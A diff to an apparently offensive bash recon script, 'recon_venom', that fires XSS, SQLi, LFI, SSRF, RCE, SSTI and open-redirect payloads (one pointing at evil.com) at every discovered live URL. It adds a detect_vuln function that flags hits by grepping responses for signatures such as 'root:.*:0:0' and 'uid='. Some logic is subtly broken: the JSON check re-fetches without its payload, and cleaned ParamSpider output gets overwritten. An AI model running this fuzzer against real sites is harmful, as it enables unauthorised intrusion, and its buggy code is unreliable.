@@ -142,10 +142,50 @@ wait $PID2
 wait $PID3
 
 WAIT_FOR_HTTPX=true
+
 echo -e "${CYAN}[*] Running ParamSpider...${NC}"
+echo -e "${CYAN}[*] Detecting ParamSpider capabilities...${NC}"
 
+PARAMSUPPORTS=$(paramspider --help 2>&1)
+RAW_OUTPUT="recon_venom/paramspider_raw.txt"
+CLEAN_OUTPUT="recon_venom/paramspider_cleaned.txt"
 
-paramspider -l recon_venom/httpx_live.txt > recon_venom/paramspider_raw.txt 2>/dev/null
+> "$RAW_OUTPUT"
+> "$CLEAN_OUTPUT"
+
+if echo "$PARAMSUPPORTS" | grep -qE -- '--domain|-d'; then
+    echo -e "${GREEN}[+] ParamSpider supports modern flags. Running per-domain scan...${NC}"
+    while read -r domain; do
+        [[ -z "$domain" ]] && continue
+        echo -e "${CYAN}[ParamSpider] Scanning $domain${NC}"
+        paramspider -d "$domain" \
+            --quiet \
+            --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
+            2>/dev/null >> "$RAW_OUTPUT"
+    done < recon_venom/httpx_live.txt
+else
+    echo -e "${YELLOW}[!] ParamSpider doesn't support modern flags. Using legacy mode...${NC}"
+    while read -r domain; do
+        [[ -z "$domain" ]] && continue
+        echo -e "${CYAN}[ParamSpider] Scanning $domain (legacy mode)${NC}"
+        paramspider "$domain" 2>/dev/null >> "$RAW_OUTPUT"
+    done < recon_venom/httpx_live.txt
+fi
+
+# Extract only param URLs 
+grep -Eo 'https?://[^ ]+\?[^ ]+' "$RAW_OUTPUT" | sort -u > "$CLEAN_OUTPUT"
+
+if [[ ! -s "$CLEAN_OUTPUT" ]]; then
+    echo -e "${YELLOW}[!] No parameterized URLs found by ParamSpider.${NC}"
+fi
+
+echo -e "${GREEN}[✔] ParamSpider finished. Cleaned output saved to:${NC} $CLEAN_OUTPUT"
+
+# Final deduped cleaned output
+sort -u "$RAW_OUTPUT" > "$CLEAN_OUTPUT"
+
+echo -e "${GREEN}[✔] ParamSpider finished. Cleaned output saved to:${NC} $CLEAN_OUTPUT"
+
 
 echo -e "${CYAN}[*] Cleaning & Merging URLs...${NC}"
 
@@ -180,18 +220,30 @@ manage_xs_jobs() {
     done
 }
 
-> recon_venom/xsstrike_results.txt  # clear file before writing
+> recon_venom/xsstrike_raw.txt
+> recon_venom/xsstrike_results_clean.txt
+> recon_venom/xsstrike_vulns.txt
 
 while read -r url; do
-    [[ -z "$url" ]] && continue  # skip empty lines
+    [[ -z "$url" ]] && continue
     manage_xs_jobs
     {
         echo -e "${CYAN}[XSStrike] Testing: $url${NC}"
-        python3 XSStrike/xsstrike.py -u "$url" --skip --crawl >> recon_venom/xsstrike_results.txt 2>/dev/null
+        XS_OUTPUT=$(python3 XSStrike/xsstrike.py -u "$url" --skip --crawl 2>/dev/null | tee -a recon_venom/xsstrike_raw.txt)
+
+        if echo "$XS_OUTPUT" | grep -iqE 'vulnerable|vulnerability|XSS'; then
+            echo "$url [VULNERABLE]" | tee -a recon_venom/xsstrike_results_clean.txt recon_venom/xsstrike_vulns.txt
+        else
+            echo "$url [Not Vulnerable]" >> recon_venom/xsstrike_results_clean.txt
+        fi
     } &
 done < recon_venom/all_cleaned_urls.txt
 
 wait
+echo -e "${GREEN}[+] Cleaned XSStrike results saved in:${NC}"
+echo -e "${CYAN}    - recon_venom/xsstrike_results_clean.txt  (All URLs with status)"
+echo -e "${CYAN}    - recon_venom/xsstrike_vulns.txt         (Only vulnerable URLs)"
+echo -e "${CYAN}    - recon_venom/xsstrike_raw.txt           (Full raw XSStrike logs)${NC}"
 
 echo -e "${GREEN}[+] Scanning phase complete.${NC}"
 
@@ -284,6 +336,51 @@ cat << 'EOF' > payloads/json.txt
 {"redirect":"http://evil.com"}
 EOF
 fi
+detect_vuln() {
+    local url="$1"
+    local payload="$2"
+    local type="$3"
+
+    response=$(curl -sk "$url" --max-time 10)
+
+    case "$type" in
+        "XSS")
+            if echo "$response" | grep -qE '<script>alert\(1\)</script>|<svg/onload=alert\(1\)>|onerror=alert'; then
+                echo -e "${GREEN}[VULNERABLE][XSS] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "SQLi")
+            if echo "$response" | grep -qE 'SQL syntax|mysql_fetch|syntax error|unterminated query'; then
+                echo -e "${GREEN}[VULNERABLE][SQLi] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "LFI")
+            if echo "$response" | grep -qE 'root:.*:0:0|boot.ini'; then
+                echo -e "${GREEN}[VULNERABLE][LFI] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "Redirect")
+            if echo "$response" | grep -qi "Location: http://evil.com"; then
+                echo -e "${GREEN}[VULNERABLE][Redirect] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "RCE")
+            if echo "$response" | grep -qE 'uid=|root|Administrator'; then
+                echo -e "${GREEN}[VULNERABLE][RCE] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "SSTI")
+            if echo "$response" | grep -qE '49|1787569'; then
+                echo -e "${GREEN}[VULNERABLE][SSTI] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+        "JSON")
+            if echo "$response" | grep -qE 'alert\(1\)|root:|uid=|error'; then
+                echo -e "${GREEN}[VULNERABLE][JSONi] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
+            fi
+            ;;
+    esac
+}
 
 
 echo -e "${GREEN}[+] Payload files ready.${NC}"
@@ -303,52 +400,49 @@ mapfile -t JSON_PAYLOADS < payloads/json.txt
 while read -r url; do
     for payload in "${XSS_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[XSS] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "XSS" & manage_jobs
     done
 
     for payload in "${SQLI_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[SQLi] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "SQLi" & manage_jobs
     done
 
     for payload in "${LFI_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[LFI] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "LFI" & manage_jobs
     done
 
     for payload in "${REDIRECT_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[Redirect] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "Redirect" & manage_jobs
     done
 
     for payload in "${SSRF_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
+        # Optional: you can enable detect_vuln if you have SSRF detection logic
         echo -e "[SSRF] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
         curl -sk "$fuzzed" -o /dev/null & manage_jobs
     done
 
     for payload in "${RCE_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[RCE] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "RCE" & manage_jobs
     done
 
     for payload in "${SSTI_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        echo -e "[SSTI] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        detect_vuln "$fuzzed" "$payload" "SSTI" & manage_jobs
     done
 
     for payload in "${JSON_PAYLOADS[@]}"; do
         echo -e "[JSON] $url -- POST Payload: $payload" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url" -o /dev/null & manage_jobs
+        response=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url")
+        detect_vuln "$url" "$payload" "JSON"
     done
 
 done < recon_venom/all_cleaned_urls.txt
+
 
 # Wait for all background jobs to finish
 wait
